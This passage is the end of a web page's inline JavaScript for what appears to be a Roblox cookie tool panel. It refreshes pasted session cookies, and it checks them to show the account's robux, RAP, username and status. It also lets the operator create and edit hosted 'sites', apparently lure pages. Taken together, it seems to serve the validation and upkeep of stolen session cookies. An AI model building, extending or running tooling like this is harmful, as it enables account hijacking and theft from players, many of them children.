const set_mode = m => { mode = m; const k = document.getElementById("tok"), r = document.getElementById("o_ref"), c = document.getElementById("o_chk"), lbl = document.getElementById("btn_lbl"); if (m === "ref") { r.classList.add("on"); c.classList.remove("on"); k.style.left = "5px"; k.style.width = r.offsetWidth + "px"; lbl.innerHTML = '<i class="bi bi-arrow-repeat"></i>Refresh'; } else { c.classList.add("on"); r.classList.remove("on"); k.style.left = (r.offsetWidth + 5) + "px"; k.style.width = c.offsetWidth + "px"; lbl.innerHTML = '<i class="bi bi-search"></i>Check'; } document.getElementById("new_cookie_wrap").classList.remove("on"); document.getElementById("out_stats").classList.remove("on"); if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_cookie")); };
const ts_token = el => { const i = el.querySelector("[name='cf-turnstile-response']"); return i ? i.value.trim() : ""; };
const do_submit = async () => { const cookie = document.getElementById("ck_in").value.trim(); if (!cookie) { toast("⚠️  Please enter a cookie."); return; } const token = ts_token(document.getElementById("ts_cookie")); if (!token) { toast("⚠️  Please complete the CAPTCHA first."); return; } const lbl = document.getElementById("btn_lbl"), orig = lbl.innerHTML; lbl.innerHTML = '<i class="bi bi-hourglass-split"></i>Loading…'; document.getElementById("new_cookie_wrap").classList.remove("on"); document.getElementById("out_stats").classList.remove("on"); try { if (mode === "ref") { const res = await api("refresh", [cookie, token], ["cookie"]); document.getElementById("new_cookie_out").value = res.cookie; document.getElementById("new_cookie_wrap").classList.add("on"); toast("✓ Cookie refreshed."); } else { const res = await api("check", [cookie, token], ["robux","rap","summary","username","status"]); document.getElementById("os_robux").textContent = res.robux || "—"; document.getElementById("os_rap").textContent = res.rap || "—"; document.getElementById("os_summary").textContent = res.summary || "—"; document.getElementById("os_username").textContent = res.username || "—"; document.getElementById("os_status").textContent = res.status || "—"; document.getElementById("out_stats").classList.add("on"); toast("✓ Check complete."); } } catch (err) { toast("✗ " + err.message); } finally { lbl.innerHTML = orig; if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_cookie")); } };
const render_sites = () => { const g = document.getElementById("sites_g"); g.innerHTML = sites.map((s, i) => `<div class="gc site_c"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_body"><div class="si_icon"><i class="bi bi-globe2"></i></div><div class="si_name">${esc(s.name)}</div><div class="si_header">${esc(s.header || "")}</div><div class="si_desc">${esc(s.description || s.desc || "")}</div><div class="si_actions"><a class="si_btn" href="/site?site_id=${s.id}" target="_blank"><i class="bi bi-eye"></i>Visit</a><button class="si_btn" onclick="copy_url('/site?site_id=${s.id}')"><i class="bi bi-link-45deg"></i>Link</button><button class="si_btn" onclick="open_edit(${i})"><i class="bi bi-pencil"></i>Edit</button></div></div></div>`).join(""); };
const copy_url = url => { const full = window.location.origin + url; navigator.clipboard.writeText(full).then(() => toast("✓ URL copied!")).catch(() => toast("✗ Failed to copy.")); };
const count_chars = (fi, ci, max) => { document.getElementById(ci).textContent = document.getElementById(fi).value.length + " / " + max; };
const reset_modal_ts = () => { if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_modal")); };
const open_create = () => { edit_i = -1; document.getElementById("mo_title_lbl").textContent = "Create Site"; ["mo_name","mo_header","mo_desc"].forEach(id => document.getElementById(id).value = ""); [["mo_name_count",40],["mo_header_count",80],["mo_desc_count",200]].forEach(([id,m]) => document.getElementById(id).textContent = "0 / " + m); reset_modal_ts(); document.getElementById("modal").classList.add("on"); };
const open_edit = i => { edit_i = i; const s = sites[i]; document.getElementById("mo_title_lbl").textContent = "Edit Site"; document.getElementById("mo_name").value = s.name; document.getElementById("mo_header").value = s.header || ""; document.getElementById("mo_desc").value = s.description || s.desc || ""; count_chars("mo_name","mo_name_count",40); count_chars("mo_header","mo_header_count",80); count_chars("mo_desc","mo_desc_count",200); reset_modal_ts(); document.getElementById("modal").classList.add("on"); };
const close_mo = () => document.getElementById("modal").classList.remove("on");
const mo_out = e => { if (e.target.id === "modal") close_mo(); };
const save_site = async () => { const name = document.getElementById("mo_name").value.trim(); const header = document.getElementById("mo_header").value.trim(); const desc = document.getElementById("mo_desc").value.trim(); if (!name) { toast("⚠️  Please enter a site name."); return; } const token = ts_token(document.getElementById("ts_modal")); if (!token) { toast("⚠️  Please complete the CAPTCHA first."); return; } const btn = document.getElementById("save_btn_lbl"), orig = btn.innerHTML; btn.innerHTML = '<i class="bi bi-hourglass-split"></i>Saving…'; try { if (edit_i === -1) { const res = await api("create_site", [name, header, desc, token], ["success"]); if (!res.success) throw new Error("server rejected the request"); sites.push({ name, header, description: desc, id: res.site_id }); last_sites_hash = null; toast("✓ Site created!"); } else { const s = sites[edit_i]; const res = await api("edit_site", [s.id, name, header, desc, token], ["success"]); if (!res.success) throw new Error("server rejected the request"); sites[edit_i] = { ...s, name, header, description: desc }; last_sites_hash = null; toast("✓ Site updated!"); } close_mo(); render_sites(); } catch (err) { toast("✗  " + err.message); } finally { btn.innerHTML = orig; reset_modal_ts(); } };
render_sites();
</script>
</body>
</html>
